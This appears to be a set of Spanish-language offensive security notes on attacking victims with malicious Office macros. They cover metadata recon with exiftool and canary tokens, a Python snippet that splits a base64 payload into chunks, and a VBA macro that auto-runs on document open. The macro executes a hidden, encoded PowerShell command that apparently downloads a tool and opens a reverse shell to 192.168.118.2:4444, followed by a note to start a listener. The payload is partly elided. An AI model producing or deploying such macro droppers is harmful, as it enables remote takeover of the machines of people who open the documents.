# Intro

- Los macros de los productos de Office nos permiten inyectar código malicioso.
- Por cuestiones de seguridad, todo lo que haya sido descargado (sea de un mail o del navegador) estará bloqueado con el cartel de **habilitar edición** y el usuario deberá accionarlo para que el macro se ejecute.


# Recon

Podemos aprovechar cualquier documento (docs, pdfs,etc) para extraer información de la metadata y tener un conocimiento más profundo de las tecnologías y versiones utilizadas por la victima. Incluido, si es una empresa, el nombre de un user


    exiftool -a -u brochure.pdf



Podemos extraer más información usando canary token y haciendolo llegar a la víctima

    https://canarytokens.com/nest/

# Creando macros para reverseshell


- El macro debe estar guardado en un .doc o .docm; los .docx no permiten guardar el macro dentro del documento. Crear el documento y darle en el tipo "windows 97-2003"
- La opción de macros esta en view > macros
- Una vez generado el macro, creamos nuestro payload malicioso en base64 y lo dividimos en partes.

### Código en python para dividirlo

      str = "<payload>"
      
      n = 50
      
      for i in range(0, len(str), n):
      	print("Str = Str + " + '"' + str[i:i+n] + '"')

### Macro malicioso


    Sub AutoOpen()
        MyMacro
    End Sub
    
    Sub Document_Open()
        MyMacro
    End Sub
    
    Sub MyMacro()
        Dim Str As String
        
        Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
            Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
            Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
        ...
            Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
            Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
            Str = Str + "A== "
    
        CreateObject("Wscript.Shell").Run Str
    End Sub


### Ponemos un listener y esperamos que se vuelva a abrir.
